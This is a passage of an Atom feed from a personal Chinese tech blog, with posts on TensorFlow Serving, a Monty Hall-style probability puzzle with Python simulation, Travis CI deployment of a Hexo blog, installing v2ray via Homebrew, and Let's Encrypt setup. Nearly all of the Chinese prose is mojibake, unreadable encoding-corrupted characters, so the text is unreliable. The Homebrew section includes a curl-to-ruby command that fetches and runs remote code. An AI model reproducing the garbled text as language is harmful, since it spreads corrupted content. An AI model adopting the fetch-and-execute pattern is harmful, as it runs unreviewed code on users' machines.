TF_SERVING_BUILD_IMAGE=<span class="variable">$USER</span>/tensorflow-serving-devel https://github.com/tensorflow/serving.git<span class="comment">#:tensorflow_serving/tools/docker</span></span></span><br></pre></td></tr></table></figure><p>ä¹‹åï¼Œä½¿ç”¨æ–°ç¼–è¯‘çš„<code>$USER/tensorflow-serving</code>é‡æ–°å¯åŠ¨æœåŠ¡å³å¯ã€‚</p><h2><span id="zong-jie">æ€»ç»“</span></h2><p>ä¸Šé¢æˆ‘ä»¬å¿«é€Ÿå®è·µäº†ä½¿ç”¨TensorFlow Servingå’ŒDockeréƒ¨ç½²æœºå™¨å­¦ä¹ æœåŠ¡çš„è¿‡ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°ï¼ŒTensorFlow Servingæä¾›äº†éå¸¸æ–¹ä¾¿å’Œé«˜æ•ˆçš„æ¨¡å‹ç®¡ç†ï¼Œé…åˆDockerï¼Œå¯ä»¥å¿«é€Ÿæ­å»ºèµ·æœºå™¨å­¦ä¹ æœåŠ¡ã€‚</p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://medium.com/tensorflow/serving-ml-quickly-with-tensorflow-serving-and-docker-7df7094aa008">Serving ML Quickly with TensorFlow Serving and Docker</a></li><li><a href="https://www.tensorflow.org/tfx/serving/tutorials/Serving_REST_simple">Train and serve a TensorFlow model with TensorFlow Serving</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨ TensorFlow Serving å’Œ Docker å¿«é€Ÿéƒ¨ç½²æœºå™¨å­¦ä¹ æœåŠ¡
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€ä¸ªå…³äºæ•°å­¦æ¦‚ç‡çš„é—®é¢˜</title>
    <link href="https://qiwihui.com/qiwihui-blog-32/"/>
    <id>https://qiwihui.com/qiwihui-blog-32/</id>
    <published>2018-10-09T05:48:11.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="ti-mu-bai-wan-ying-xiong">é¢˜ç›®â€“ç™¾ä¸‡è‹±é›„</span></h2><p>ä½ å‚åŠ ä¸€ä¸ªæ¸¸æˆï¼Œåœ¨ä½ é¢å‰æœ‰4å¼ 1000ä¸‡æ”¯ç¥¨ï¼Œå…¶ä¸­ä¸€å¼ æ˜¯çœŸçš„ã€‚æ¸¸æˆå¼€å§‹ï¼Œä½ é€‰äº†ä¸€å¼ ï¼Œä¹‹åä¸»æŒäººåœ¨å‰©ä¸‹çš„3å¼ é‡Œï¼Œé€‰æ‹©ä¸€ä¸ªå±•ç¤ºå‡ºæ¥ï¼ŒéªŒè¯åå‘ç°æ˜¯å‡çš„ã€‚</p><p>é—®é¢˜ï¼šè¯·åˆ†æƒ…å†µç†æ€§åˆ†æï¼Œæ­¤æ—¶ï¼Œä½ çš„å‚èµ›æƒçš„ä»·æ ¼</p><ul><li>æƒ…å†µä¸€ï¼šä¸å…è®¸ä¿®æ”¹ä¹‹å‰çš„é€‰æ‹©</li><li>æƒ…å†µäºŒï¼šæœ‰é‡æ–°é€‰æ‹©çš„æƒåˆ©</li></ul><p>å›ç­”ï¼šè¯·ç”¨ä¸‹é¢ä¸¤ç§æ–¹æ³•åˆ†åˆ«ä½œç­”</p><ul><li>æ–¹å¼1ï¼ˆç†è®ºæ¨å¯¼ï¼‰ï¼šè¯·ç»™å‡ºç†è®ºæ¨å¯¼å’Œè®¡ç®—è¿‡ç¨‹ï¼Œæƒ…å†µäºŒéœ€è¯´æ˜å¦‚ä½•è¡Œä½¿æƒåŠ›ï¼›</li><li>æ–¹å¼2ï¼ˆç¼–ç¨‹æ¨¡æ‹Ÿï¼‰ï¼šä½¿ç”¨ç¨‹åºå‡†ç¡®å®¢è§‚åœ°æ¨¡æ‹Ÿä¸Šè¿°ä¸¤ç§æƒ…å†µä¸‹ï¼Œé€‰æ‰‹å¹³å‡è·å¾—çš„å¥–é‡‘ï¼Œå¾—åˆ°å‚èµ›æƒçš„ä»·æ ¼ã€‚</li></ul><span id="more"></span><h2><span id="jie-da">è§£ç­”</span></h2><p>æ–¹å¼1ï¼ˆç†è®ºæ¨å¯¼ï¼‰</p><p>æƒ…å†µ1: ä¸èƒ½é‡æ–°é€‰æ‹©æ—¶è·å¥–çš„æ¦‚ç‡æ˜¯1/4æƒ…å†µ2: å¯ä»¥é‡æ–°é€‰æ‹©æ—¶æ˜¯3/8ç†ç”±ï¼š</p><ol><li>ä¸èƒ½é‡æ–°é€‰æ‹©æ—¶ï¼Œä½ çš„é€‰æ‹©ä¸å—ä¸»æŒäººé€‰æ‹©çš„å½±å“ï¼Œæ•…ä¸º 1/4ï¼›</li><li>å¯ä»¥é‡æ–°é€‰æ‹©æ—¶ï¼Œä¼šå—ä¸»æŒäººçš„å½±å“ï¼Œæ˜¯åéªŒæ¦‚ç‡ï¼›ç¬¬ä¸€æ­¥é€‰æ‹©æ—¶ï¼Œæœ‰å››ç§å¯é€‰ï¼Œæœ‰ <code>1/4</code> é€‰æ‹©çœŸå®çš„ï¼Œ<code>3/4</code> é€‰æ‹©é”™è¯¯çš„ï¼Œä¸»æŒäººçš„é€‰æ‹©åœ¨å‰©ä¸‹çš„ä¸‰ä¸ªä¸­æ’é™¤äº†ä¸€ä¸ªé”™è¯¯çš„ï¼Œå‰©ä¸¤ä¸ªã€‚é€‰æ‹©çœŸå®åé‡é€‰ï¼Œå†æ¬¡é€‰ä¸­çš„æ¦‚ç‡ä¸º0ï¼Œæ•…ä¸º <code>1/4 * 0 = 0</code>ï¼›é€‰æ‹©å‡çš„åé‡é€‰ï¼Œé€‰ä¸­æ¦‚ç‡ä¸º1/2ï¼Œæ•…ä¸º <code>3/4 * 1/2 = 3/8</code>ï¼›æ€»çš„é€‰ä¸­çœŸçš„æ¦‚ç‡ä¸º <code>0 + 3/8 = 3/8</code>ã€‚</li></ol><p>æ–¹å¼2ï¼ˆç¼–ç¨‹æ¨¡æ‹Ÿï¼‰:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hero</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è‹±é›„</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, nums</span>):</span><br><span class="line">        self.num = random.choice(nums)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Host</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸»æŒäºº</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pick</span>(<span class="params">self, nums, bnum</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;ä¸»æŒäºº</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.num = random.choice(nums)</span><br><span class="line">        <span class="keyword">while</span> bnum == self.num:</span><br><span class="line">            self.num = random.choice(nums)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MH</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ¸¸æˆè¿‡ç¨‹</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.nums = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">        self.host = Host()</span><br><span class="line">        self.hero = Hero()</span><br><span class="line">        self.bnum = random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reward</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¥–åŠ±</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.hero.num == self.bnum:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_without_regret</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;ä¸å…è®¸ä¿®æ”¹ä¹‹å‰çš„é€‰æ‹©</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.hero.pick(self.nums)</span><br><span class="line">        self.nums.remove(self.hero.num)</span><br><span class="line">        self.host.pick(self.nums, self.bnum)</span><br><span class="line">        <span class="keyword">return</span> self.reward()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play_with_regret</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æœ‰é‡æ–°é€‰æ‹©çš„æƒåˆ©</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.hero.pick(self.nums)</span><br><span class="line">        self.nums.remove(self.hero.num)</span><br><span class="line">        self.host.pick(self.nums, self.bnum)</span><br><span class="line">        self.nums.remove(self.host.num)</span><br><span class="line">        self.hero.pick(self.nums)</span><br><span class="line">        <span class="keyword">return</span> self.reward()</span><br><span class="line"></span><br><span class="line">sum1 = <span class="number">0</span></span><br><span class="line">sum2 = <span class="number">0</span></span><br><span class="line"><span class="comment"># æ¨¡æ‹Ÿ10000æ¬¡</span></span><br><span class="line">times = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">    sum1 += MH().play_without_regret()</span><br><span class="line">    sum2 += MH().play_with_regret()</span><br><span class="line">avg1 = sum1/<span class="built_in">float</span>(times)</span><br><span class="line">avg2 = sum2/<span class="built_in">float</span>(times)</span><br><span class="line"><span class="built_in">print</span>(avg1)</span><br><span class="line"><span class="built_in">print</span>(avg2)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt; python bh.py</span><br><span class="line">24.81</span><br><span class="line">37.12</span><br></pre></td></tr></table></figure><p>ä¸ç†è®ºè®¡ç®—ä¸€è‡´</p><h2><span id="yin-shen">å¼•ç”³</span></h2><p>ä¸‰é—¨é—®é¢˜ï¼ˆMonty Hall Problemï¼‰ç”µå½±ã€Šå†³èƒœ21ç‚¹ã€‹</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä¸€ä¸ªå…³äºæ•°å­¦æ¦‚ç‡çš„é—®é¢˜
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="æ•°å­¦" scheme="https://qiwihui.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨ Travis CI è‡ªåŠ¨æ›´æ–°åšå®¢</title>
    <link href="https://qiwihui.com/qiwihui-blog-29/"/>
    <id>https://qiwihui.com/qiwihui-blog-29/</id>
    <published>2018-10-09T05:46:36.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>Travis CI è‡ªåŠ¨æ£€æµ‹ä»£ç å˜åŒ–ï¼Œæ‹‰å–ï¼Œç¼–è¯‘åšå®¢å¹¶éƒ¨ç½²åˆ° GitHub Pages</p><p>å†™å¥½åšå®¢ä¹‹åï¼Œéƒ¨ç½²æ€»ä¼šå å»ä¸€æ®µæ—¶é—´ï¼šç¼–è¯‘ã€éƒ¨ç½²ã€æ¨é€å’Œæ£€æŸ¥ã€‚æ‰‹åŠ¨éƒ¨ç½²å¤šäº†ä¹Ÿå°±çƒ¦äº†ï¼Œä¸€åˆ™å®¹æ˜“å‡ºé”™ï¼Œæ¯”å¦‚æŠŠ master åˆ†æ”¯ç”¨ gh-pages åˆ†æ”¯è¦†ç›–äº†ï¼ŒäºŒåˆ™åŠ³åŠ¨æ˜¯é‡å¤çš„ï¼Œé‡å¤çš„åŠ³åŠ¨å°±åº”è¯¥è‡ªåŠ¨åŒ–å»è§£å†³ã€‚</p><span id="more"></span><h2><span id="zui-zao-de-xiang-fa">æœ€æ—©çš„æƒ³æ³•</span></h2><p>ä½¿ç”¨ GitHub Webhooks å®ç°è‡ªåŠ¨éƒ¨ç½²ï¼Œè¿™å°±éœ€è¦æœ‰ä¸€å°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ä¸Šå¯åŠ¨æœåŠ¡æ¥å— Github çš„å›è°ƒï¼Œç„¶åæ‹‰å–ä»£ç ï¼Œç¼–è¯‘ï¼Œå°†ç¼–è¯‘åçš„ä»£ç è¦ä¹ˆéƒ¨ç½²åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œè¦ä¹ˆæ¨é€åˆ°ä»£ç  gh-pages åˆ†æ”¯ä¸Šã€‚å‰è€…é¢å¤–éœ€è¦ç¼–å†™æœåŠ¡ï¼Œé…ç½®åšå®¢ Nginxï¼Œå¯èƒ½è¿˜éœ€è¦é…ç½® HTTPSï¼Œä»¥åŠå¯¹æœåŠ¡å™¨è¿›è¡ŒåŠ å›ºï¼Œæ€»å½’å°±æ˜¯éœ€è¦é¢å¤–çš„æ›´å¤šä¸œè¥¿æ¥æ”¯æŒã€‚æ‰€ä»¥è¿˜æ˜¯è§‰å¾—ç”¨å·²ç»å­˜åœ¨çš„çº¿ä¸Šè‡ªåŠ¨åŒ–æœåŠ¡æ–¹ä¾¿ä¸€äº›ï¼ˆå…¶å®å°±æ˜¯æ‡’ï¼‰ã€‚</p><h2><span id="travis-ci">Travis CI</span></h2><p>æŒç»­é›†æˆï¼ˆContinuous Integrationï¼ŒCIï¼‰çš„ SaaS æœåŠ¡ï¼Œå¥½å¤„ä¸è¨€è€Œå–»ã€‚</p><h2><span id="pei-zhi-travis">é…ç½® Travis</span></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install travis</span><br><span class="line">travis login</span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"><span class="attr">node_js:</span></span><br><span class="line"><span class="bullet">-</span> <span class="number">6.9</span><span class="number">.0</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="string">--init</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="string">-g</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo</span> <span class="string">generate</span> <span class="string">--deploy</span> <span class="string">--quiet</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">directories:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">node_modules</span></span><br><span class="line"><span class="attr">notifications:</span></span><br><span class="line">  <span class="attr">email:</span></span><br><span class="line">    <span class="attr">recipients:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">qwh005007@gmail.com</span></span><br><span class="line">    <span class="attr">on_success:</span> <span class="string">change</span></span><br><span class="line">    <span class="attr">on_failure:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><h2><span id="shi-yong-travis-zi-dong-bu-shu">ä½¿ç”¨ Travis è‡ªåŠ¨éƒ¨ç½²</span></h2><p><code>ERROR Deployer not found: git</code></p><p><a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a></p><p><code>npm install hexo-deployer-git --save</code></p><h2><span id="pei-zhi-ren-zheng">é…ç½®è®¤è¯</span></h2><p>å¾€ Github ä»“åº“ä¸­æäº¤ä»£ç æ˜¯éœ€è¦è®¤è¯çš„ï¼Œä¸ç®¡æ˜¯ç”¨ç”¨æˆ·å¯†ç ï¼ŒAccess Tokenè¿˜æ˜¯SSH keyã€‚ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥å°†è®¤è¯å†™åœ¨ <code>.config.yml</code> ä¸­ï¼Œä¸æ˜¯è¯´ä¸è¡Œï¼Œæ˜¯å¤ªå¹´è½»ã€‚å¥½åœ¨ Travis CI ä¸ä»…æ”¯æŒ<a href="https://docs.travis-ci.com/user/encrypting-files/">åŠ å¯†æ–‡ä»¶</a>ï¼Œä¹Ÿæ”¯æŒ<a href="https://docs.travis-ci.com/user/encryption-keys/">åŠ å¯† Keys</a>ï¼Œè¿™å°±ä¸ºè®¤è¯è¿™ä¸€å—æ‰«æ¸…äº†é“è·¯ï¼Œæˆ‘å†³å®šä½¿ç”¨ OAuth è®¤è¯ Git æ¥æäº¤ä»£ç åˆ°ä»“åº“ä¸­ã€‚</p><p>æ“ä½œæ­¥éª¤ï¼š</p><ol><li><p>ç”Ÿæˆ Github Personal Access Tokenï¼›</p></li><li><p>ä½¿ç”¨ Travis CI å‘½ä»¤è¡ŒåŠ å¯† Personal Access Tokenï¼›</p> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">travis encrypt GH_TOKEN=&lt;token&gt; --add</span><br></pre></td></tr></table></figure></li><li><p>åœ¨ <code>.travis.yml</code> ä¸­æ·»åŠ é…ç½®</p> <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">before_install:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">push.default</span> <span class="string">matching</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">&quot;qiwihui via Travis CI&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">&quot;qwh005007@gmail.com&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">sed</span> <span class="string">-i&#x27;&#x27;</span> <span class="string">&quot;/^ *repo/s~github\.com~$&#123;GH_TOKEN&#125;@github.com~&quot;</span> <span class="string">_config.yml</span></span><br></pre></td></tr></table></figure> <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secure:</span> <span class="string">IYXTVHItgbEn...</span></span><br></pre></td></tr></table></figure></li></ol><h2><span id="zai-travsi-ci-zhong-pei-zhi-xiang-mu">åœ¨ Travsi CI ä¸­é…ç½®é¡¹ç›®</span></h2><ol><li>Publicizing or hiding organization membership</li></ol><h2><span id="zi-ding-yi-yu-ming">è‡ªå®šä¹‰åŸŸå</span></h2><ol><li><a href="http://qiwihui.github.io/qiwihui/">qiwihui.github.io/qiwihui/</a> =&gt; <a href="http://blog.qiwihui.com">blog.qiwihui.com</a></li><li>Enforce https</li></ol><p>èƒœåˆ©å®Œæˆ!</p><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://notes.iissnan.com/2016/publishing-github-pages-with-travis-ci/">ä½¿ç”¨ Travis CI è‡ªåŠ¨æ›´æ–° GitHub Pages</a></li><li><a href="http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/">Hexo è‡ªåŠ¨éƒ¨ç½²åˆ° Github</a></li><li><a href="https://blog.github.com/2012-09-21-easier-builds-and-deployments-using-git-over-https-and-oauth/">Easier builds and deployments using Git over HTTPS and OAuth</a></li><li><a href="https://help.github.com/articles/publicizing-or-hiding-organization-membership/">Publicizing or hiding organization membership</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ä½¿ç”¨ Travis CI è‡ªåŠ¨æ›´æ–°åšå®¢
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>ç”¨Homebrew å®‰è£… v2ray ä»¥åŠ Homebrew-cask å®‰è£… V2RayX</title>
    <link href="https://qiwihui.com/qiwihui-blog-27/"/>
    <id>https://qiwihui.com/qiwihui-blog-27/</id>
    <published>2018-10-09T05:45:00.000Z</published>
    <updated>2024-05-15T02:25:31.473Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å¼€å§‹è½¬å‘ä½¿ç”¨ v2ray ä½œä¸ºä¸»è¦çš„ç¿»å¢™å·¥å…·ï¼Œåœ¨ macOS ä¸Šå®‰è£…å’Œä½¿ç”¨éƒ½éœ€è¦ä¸‹è½½ç¼–è¯‘å¥½çš„è½¯ä»¶åŒ…ç„¶åè§£åŒ…ä½¿ç”¨ï¼Œä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Œè”ç³»åˆ° macOS ä¸‹å¸¸ç”¨çš„åŒ…ç®¡ç† Homebrewï¼Œä½•ä¸è‡ªå·±æäº¤ä¸€ä¸ªï¼Ÿ</p><span id="more"></span><h3><span id="v2ray-ji-v2rayx-shi-sha">v2rayåŠV2RayXæ˜¯å•¥ï¼Ÿ</span></h3><blockquote><p>V2Ray æ˜¯ä¸€ä¸ªæ¨¡å—åŒ–çš„ä»£ç†è½¯ä»¶åŒ…ï¼Œå®ƒçš„ç›®æ ‡æ˜¯æä¾›å¸¸ç”¨çš„ä»£ç†è½¯ä»¶æ¨¡å—ï¼Œç®€åŒ–ç½‘ç»œä»£ç†è½¯ä»¶çš„å¼€å‘ã€‚</p></blockquote><p>ç®€å•è¯´ <a href="https://github.com/v2ray/v2ray-core">v2ray</a> å°±æ˜¯ç¿»å¢™ä»£ç†è½¯ä»¶ï¼ˆä½†ä¸æ­¢äºè½¯ä»¶ï¼Œæ˜¯ä¸€ä¸ªå¹³å°ï¼‰ã€‚<a href="https://github.com/Cenmrev/V2RayX">V2RayX</a> å°±æ˜¯ macOS ä¸‹ä¸€ä¸ªç®€å•çš„ v2ray çš„GUIç¨‹åºã€‚</p><h3><span id="homebrew-ni">Homebrewå‘¢ï¼Ÿ</span></h3><p>macOSä¸Šå¼ºå¤§çš„åŒ…ç®¡ç†å·¥å…·ï¼Œç±»ä¼¼äºUbuntuçš„aptã€‚</p><p>å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/ruby -e <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ï¼Œæ¯”å¦‚ä¸‹è½½ <code>curl</code>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install curl</span><br></pre></td></tr></table></figure><h3><span id="an-zhuang-v2ray">å®‰è£…v2ray</span></h3><p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œå®˜æ–¹çš„Homebrew Formulaä¸æ¥å— v2ray æºï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±å†™äº†ï¼Œè§ <a href="https://github.com/qiwihui/homebrew-v2ray">qiwihui/homebrew-v2ray</a>ã€‚</p><p>å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew tap qiwihui/v2ray</span><br><span class="line">brew install v2ray-core</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ï¼š</p><p>é¦–å…ˆï¼Œéœ€è¦é…ç½® <code>/usr/local/etc//v2ray.config.json</code>ï¼›å…¶æ¬¡ï¼Œé…ç½®v2rayç™»å½•æ—¶è‡ªåŠ¨å¼€å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew services start v2ray-core</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼Œå¯ä»¥æ‰‹åŠ¨è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">v2ray -config=/usr/local/etc//v2ray.config.json</span><br></pre></td></tr></table></figure><h3><span id="an-zhuang-v2rayx">å®‰è£…V2RayX</span></h3><p>æˆ‘å‘å®˜æ–¹ <a href="https://caskroom.github.io/">Homebrew-Cask</a> æäº¤äº†ä¸€ä¸ªFormulaï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å®‰è£…</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew cask install v2rayx</span><br></pre></td></tr></table></figure><p>ä¸è¿‡GUIæ¯•ç«Ÿä¸èƒ½è¦†ç›–å‘½ä»¤è¡Œçš„å…¨éƒ¨åŠŸèƒ½ï¼Œæ‰€ä»¥èƒ½ç”¨å‘½ä»¤è¡Œv2rayçš„è¯ï¼Œå°±å°½é‡ä¸ä½¿ç”¨V2RayXå§ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ç”¨Homebrew å®‰è£… v2ray ä»¥åŠ Homebrew-cask å®‰è£… V2RayX
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>ä½¿ç”¨å…è´¹çš„letâ€™s encryptè¯ä¹¦ä¸ºç½‘ç«™å¼€å¯httpsï¼ˆå·²è¿‡æ—¶ï¼‰</title>
    <link href="https://qiwihui.com/qiwihui-blog-23/"/>
    <id>https://qiwihui.com/qiwihui-blog-23/</id>
    <published>2018-10-09T05:39:29.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ç¯‡åšå®¢å°†ä»‹ç»ä½¿ç”¨å…è´¹çš„letâ€™s encryptè¯ä¹¦, ä¸ºç½‘ç«™å¼€å¯httpsã€‚</p><span id="more"></span><h2><span id="https-jian-jie">HTTPSç®€ä»‹</span></h2><p>(https, http over ssl)</p><h2><span id="wei-sha-yao-yong-let-s-encrypt">ä¸ºå•¥è¦ç”¨Letâ€™s Encrypt</span></h2><p>(free, easy)</p><h2><span id="let-s-encrypt-jie-shao">Letâ€™s Encryptä»‹ç»</span></h2><p>(directory tree)</p><h2><span id="an-zhuang-shi-jian">å®‰è£…å®è·µ</span></h2><p>æˆ‘ä½¿ç”¨çš„æ˜¯Debian 7ï¼Œå…¶ä»–ç³»ç»Ÿç±»ä¼¼ã€‚</p><ol><li>ä½¿ç”¨å®˜æ–¹æ¨èçš„<code>letsencrypt-auto</code>å®‰è£…ï¼š</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/letsencrypt/letsencrypt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> letsencrypt</span><br><span class="line"></span><br><span class="line">$ ./letsencrypt-auto --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><ol start="2"><li>è·å–è¯ä¹¦</li></ol><p>å®éªŒå‰ï¼Œæˆ‘å·²å°†<code>www.qiwihui.com</code>ç«™ç‚¹ç§»åˆ°äº†è¦å®‰è£…çš„æœåŠ¡å™¨ä¸Šï¼Œnginxå·²ç»åœ¨è¿è¡Œï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ webroot æ¨¡å¼æ¥è·å–è¯ä¹¦ï¼Œå…ˆå®‰è£…webrootæ’ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯ä»¥ä¸ç”¨åœæ­¢ Web æœåŠ¡å°±èƒ½è®© Letâ€™s Encrypt éªŒè¯åŸŸåçš„æ’ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ /.well-known &#123;</span><br><span class="line">    allow all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®‰è£…è¯ä¹¦å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./letsencrypt-auto certonly --webroot --webroot-path /var/www/blog/ -d qiwihui.com -d www.qiwihui.com --agree-tos --email 